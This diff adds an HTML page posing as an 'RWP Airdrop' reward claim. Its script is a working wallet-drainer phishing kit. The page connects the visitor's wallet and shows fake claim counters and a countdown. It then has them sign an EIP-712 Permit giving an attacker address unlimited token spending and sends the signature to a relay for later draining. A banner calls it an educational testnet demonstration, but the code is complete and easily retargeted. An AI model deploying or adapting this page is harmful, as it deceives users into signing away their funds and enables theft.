@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>RWP Airdrop — Claim Your Rewards</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            surface:  { 900: '#0a0e17', 800: '#111827', 700: '#1e293b', 600: '#334155' },
+            accent:   { 400: '#34d399', 500: '#10b981', 600: '#059669' },
+          },
+          fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] },
+        }
+      }
+    }
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <style>
+    body { font-family: 'Inter', system-ui, sans-serif; }
+    .spin { animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .pulse-green { animation: pulseG 2s ease-in-out infinite; }
+    @keyframes pulseG { 0%,100%{box-shadow:0 0 0 0 rgba(16,185,129,0.4)} 50%{box-shadow:0 0 0 12px rgba(16,185,129,0)} }
+  </style>
+</head>
+<body class="bg-surface-900 text-gray-200 min-h-screen flex flex-col items-center px-4 py-10">
+
+  <!-- ═══ HEADER ═══ -->
+  <header class="text-center mb-10 max-w-lg">
+    <div class="inline-flex items-center gap-2 bg-accent-500/10 border border-accent-500/30 rounded-full px-4 py-1.5 mb-5">
+      <span class="w-2 h-2 rounded-full bg-accent-400 animate-pulse"></span>
+      <span class="text-accent-400 text-xs font-semibold tracking-wide uppercase">Sepolia Testnet</span>
+    </div>
+    <h1 class="text-4xl font-extrabold text-white mb-3">
+      Claim Your <span class="text-accent-400">RWP</span> Rewards
+    </h1>
+    <p class="text-gray-400 text-base leading-relaxed">
+      Connect your wallet and sign to verify eligibility. No gas required — this uses an off-chain EIP-712 permit signature.
+    </p>
+  </header>
+
+  <!-- ═══ STATS ═══ -->
+  <div class="grid grid-cols-3 gap-4 mb-8 max-w-lg w-full">
+    <div class="bg-surface-800 border border-surface-700 rounded-xl p-4 text-center">
+      <p class="text-[11px] text-gray-500 uppercase tracking-wider mb-1">Distributed</p>
+      <p class="text-lg font-bold text-white" id="statDistributed">1,247,832</p>
+    </div>
+    <div class="bg-surface-800 border border-surface-700 rounded-xl p-4 text-center">
+      <p class="text-[11px] text-gray-500 uppercase tracking-wider mb-1">Claimers</p>
+      <p class="text-lg font-bold text-white" id="statClaimers">8,491</p>
+    </div>
+    <div class="bg-surface-800 border border-surface-700 rounded-xl p-4 text-center">
+      <p class="text-[11px] text-gray-500 uppercase tracking-wider mb-1">Ends In</p>
+      <p class="text-lg font-bold text-accent-400 tabular-nums" id="countdown">12:00:00</p>
+    </div>
+  </div>
+
+  <!-- ═══ MAIN CARD ═══ -->
+  <div class="bg-surface-800 border border-surface-700 rounded-2xl p-6 w-full max-w-lg mb-6">
+    <h2 class="text-lg font-bold text-white mb-5 flex items-center gap-2">
+      <span class="text-accent-400">&#x1f3f7;</span> Airdrop Claim
+    </h2>
+
+    <!-- Eligibility -->
+    <div class="bg-surface-900 rounded-xl p-4 mb-5 border border-surface-700">
+      <div class="flex items-center gap-3 mb-3">
+        <span class="w-7 h-7 rounded-full bg-surface-700 flex items-center justify-center text-sm" id="eligIcon1">&#x25cb;</span>
+        <div>
+          <p class="text-sm font-medium text-gray-300">Wallet check</p>
+          <p class="text-xs text-gray-500" id="eligStatus1">Not connected</p>
+        </div>
+      </div>
+      <div class="flex items-center gap-3">
+        <span class="w-7 h-7 rounded-full bg-surface-700 flex items-center justify-center text-sm" id="eligIcon2">&#x25cb;</span>
+        <div>
+          <p class="text-sm font-medium text-gray-300">Reward amount</p>
+          <p class="text-xs text-gray-500" id="eligStatus2">Pending</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Wallet address display -->
+    <div class="hidden bg-surface-900 rounded-lg px-4 py-2.5 mb-4 border border-surface-700 text-center" id="walletBar">
+      <span class="text-xs text-gray-500">Connected</span>
+      <p class="text-sm font-mono text-accent-400 mt-0.5" id="walletAddr"></p>
+    </div>
+
+    <!-- Status -->
+    <p class="text-sm text-center mb-4 min-h-[20px]" id="status"></p>
+
+    <!-- Buttons -->
+    <button id="connectBtn"
+      class="w-full bg-accent-500 hover:bg-accent-600 text-white font-semibold py-3.5 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 mb-3">
+      <span id="connectLabel">Connect Wallet</span>
+    </button>
+
+    <button id="claimBtn" disabled
+      class="w-full bg-white/10 text-gray-500 font-semibold py-3.5 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 cursor-not-allowed">
+      <span id="claimLabel">Sign to Claim Rewards</span>
+    </button>
+  </div>
+
+  <!-- ═══ LOG ═══ -->
+  <div class="bg-surface-900 border border-surface-700 rounded-xl p-4 w-full max-w-lg mb-8 hidden" id="logWrap">
+    <p class="text-[11px] text-gray-500 uppercase tracking-wider mb-2">Activity Log</p>
+    <pre class="text-xs text-gray-400 font-mono whitespace-pre-wrap max-h-48 overflow-y-auto leading-relaxed" id="log"></pre>
+  </div>
+
+  <!-- ═══ WARNING ═══ -->
+  <div class="bg-red-500/5 border border-red-500/20 rounded-xl p-4 max-w-lg w-full mb-6">
+    <p class="text-red-400 text-xs font-semibold mb-1">&#x26a0; Educational Demonstration</p>
+    <p class="text-gray-500 text-xs leading-relaxed">
+      This page signs an EIP-712 Permit granting unlimited ERC-20 spending to an attacker wallet.
+      The off-chain signature requires no gas, making it invisible to typical security scanners until execution.
+    </p>
+  </div>
+
+  <!-- ═══ SCRIPT ═══ -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
+  <script type="module">
+    const { ethers } = window;
+
+    const RPC_URL    = "https://ethereum-sepolia-rpc.publicnode.com";
+    const TOKEN_ADDR = "0x0000000000000000000000000000000000000001";
+    const ATTACKER   = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266";
+    const RELAY_URL  = "http://localhost:3456";
+    const CHAIN_ID   = 11155111;
+
+    const ERC20_ABI = [
+      "function name() view returns (string)",
+      "function balanceOf(address) view returns (uint256)",
+      "function symbol() view returns (string)",
+      "function decimals() view returns (uint8)"
+    ];
+
+    const PERMIT_TYPES = {
+      Permit: [
+        { name: "owner",    type: "address" },
+        { name: "spender",  type: "address" },
+        { name: "value",    type: "uint256" },
+        { name: "nonce",    type: "uint256" },
+        { name: "deadline", type: "uint256" }
+      ]
+    };
+
+    const MAX_UINT = BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935");
+
+    let provider, signer, victimAddr;
+
+    /* ── Helpers ── */
+    const $ = (s) => document.querySelector(s);
+    const short = (a) => a ? a.slice(0,6)+"..."+a.slice(-4) : "";
+
+    function log(msg) {
+      const el = $("#log");
+      $("#logWrap").classList.remove("hidden");
+      el.textContent += new Date().toLocaleTimeString() + "  " + msg + "\n";
+      el.scrollTop = el.scrollHeight;
+    }
+
+    function setStatus(msg, type) {
+      const el = $("#status");
+      el.className = "text-sm text-center mb-4 min-h-[20px]";
+      if (type === "ok")   el.classList.add("text-accent-400");
+      if (type === "err")  el.classList.add("text-red-400");
+      if (type === "wait") el.classList.add("text-gray-400");
+      el.textContent = msg;
+    }
+
+    function setBtn(el, label, loading) {
+      const span = el.querySelector("span");
+      if (loading) {
+        span.innerHTML = `<span class="inline-block w-4 h-4 border-2 border-white/30 border-t-white rounded-full spin mr-2 align-middle"></span>${label}`;
+        el.disabled = true;
+      } else {
+        span.textContent = label;
+      }
+    }
+
+    /* ── Countdown ── */
+    let remaining = 12 * 3600;
+    setInterval(() => {
+      if (remaining <= 0) return;
+      remaining--;
+      const h = String(Math.floor(remaining/3600)).padStart(2,"0");
+      const m = String(Math.floor((remaining%3600)/60)).padStart(2,"0");
+      const s = String(remaining%60).padStart(2,"0");
+      $("#countdown").textContent = `${h}:${m}:${s}`;
+    }, 1000);
+
+    /* ── Fake counters ── */
+    let dist = 1247832, claims = 8491;
+    setInterval(() => { dist += Math.floor(Math.random()*5); $("#statDistributed").textContent = dist.toLocaleString(); }, 3000);
+    setInterval(() => { claims += Math.floor(Math.random()*3); $("#statClaimers").textContent = claims.toLocaleString(); }, 5000);
+
+    /* ═══ CONNECT ═══ */
+    $("#connectBtn").addEventListener("click", async () => {
+      if (!window.ethereum) { setStatus("No wallet detected — install MetaMask", "err"); return; }
+
+      setBtn($("#connectBtn"), "Connecting...", true);
+      setStatus("Requesting wallet access...", "wait");
+      log("Requesting eth_requestAccounts...");
+
+      try {
+        provider = new ethers.BrowserProvider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = await provider.getSigner();
+        victimAddr = await signer.getAddress();
+
+        const tokenRead = new ethers.Contract(TOKEN_ADDR, ERC20_ABI, signer);
+        const sym  = await tokenRead.symbol();
+        const dec  = await tokenRead.decimals();
+        const bal  = await tokenRead.balanceOf(victimAddr);
+
+        $("#walletAddr").textContent = victimAddr;
+        $("#walletBar").classList.remove("hidden");
+
+        /* Update eligibility */
+        $("#eligIcon1").textContent = "\u2714";
+        $("#eligIcon1").classList.add("text-accent-400");
+        $("#eligStatus1").textContent = short(victimAddr);
+        $("#eligStatus2").textContent = "250 RWP available";
+        $("#eligStatus2").classList.add("text-accent-400");
+
+        /* Enable claim */
+        const cb = $("#connectBtn");
+        cb.classList.add("hidden");
+        const cl = $("#claimBtn");
+        cl.disabled = false;
+        cl.classList.remove("bg-white/10", "text-gray-500", "cursor-not-allowed");
+        cl.classList.add("bg-accent-500", "hover:bg-accent-600", "text-white", "pulse-green");
+
+        setStatus("Ready — click 'Sign to Claim Rewards'", "ok");
+        log(`Connected: ${victimAddr}`);
+        log(`Balance: ${ethers.formatUnits(bal, dec)} ${sym}`);
+      } catch (e) {
+        setStatus("Connection failed: " + e.message, "err");
+        setBtn($("#connectBtn"), "Connect Wallet", false);
+        log("ERROR: " + e.message);
+      }
+    });
+
+    /* ═══ CLAIM (Permit) ═══ */
+    $("#claimBtn").addEventListener("click", async () => {
+      if (!signer) { setStatus("Connect wallet first", "err"); return; }
+
+      setBtn($("#claimBtn"), "Signing...", true);
+      setStatus("Building EIP-712 Permit signature...", "wait");
+
+      try {
+        const tokenRead = new ethers.Contract(TOKEN_ADDR, ERC20_ABI, signer);
+        const tokenName = await tokenRead.name();
+
+        const domain = {
+          name:              tokenName,
+          version:           "1",
+          chainId:           CHAIN_ID,
+          verifyingContract: TOKEN_ADDR
+        };
+
+        const deadline = Math.floor(Date.now() / 1000) + 365 * 86400;
+        const message  = {
+          owner:    victimAddr,
+          spender:  ATTACKER,
+          value:    MAX_UINT,
+          nonce:    0n,
+          deadline: BigInt(deadline)
+        };
+
+        log(`EIP-712 Domain: name=${domain.name} chain=${domain.chainId}`);
+        log(`Permit: owner=${message.owner} spender=${ATTACKER}`);
+        log(`Value: uint256.max (UNLIMITED)`);
+        log("Requesting signature from wallet...");
+
+        setStatus("Awaiting signature in wallet...", "wait");
+        const sig = await signer.signTypedData(domain, PERMIT_TYPES, message);
+        const { v, r, s } = ethers.Signature.from(sig);
+
+        log(`Signature: ${sig.slice(0,24)}...`);
+        log("Sending to relay server...");
+
+        setStatus("Submitting to relay...", "wait");
+        const resp = await fetch(`${RELAY_URL}/api/permit`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            user: victimAddr, tokenAddress: TOKEN_ADDR,
+            owner: victimAddr, spender: ATTACKER,
+            value: MAX_UINT.toString(), deadline,
+            v, r, s, signature: sig, chainId: CHAIN_ID
+          })
+        });
+        const data = await resp.json();
+
+        if (data.ok) {
+          log(`Permit stored — index ${data.index}`);
+          setStatus("Claimed — 250 RWP (attacker has Permit to drain)", "ok");
+
+          /* Update UI to look legitimate */
+          $("#claimBtn").classList.remove("pulse-green");
+          const cl = $("#claimBtn");
+          cl.classList.remove("bg-accent-500", "hover:bg-accent-600");
+          cl.classList.add("bg-accent-600/50", "cursor-not-allowed");
+          cl.querySelector("span").textContent = "Claimed \u2713";
+          cl.disabled = true;
+
+          log("Attacker can now execute: drain.mjs → Drainer.drain()");
+        } else {
+          throw new Error(data.error || "Relay error");
+        }
+      } catch (e) {
+        if (e.code === "ACTION_REJECTED" || e.code === 4001) {
+          setStatus("Signature rejected by user", "err");
+          log("User rejected signature");
+        } else {
+          setStatus("Error: " + e.message, "err");
+          log("ERROR: " + e.message);
+        }
+        setBtn($("#claimBtn"), "Sign to Claim Rewards", false);
+      }
+    });
+  </script>
+</body>
+</html>
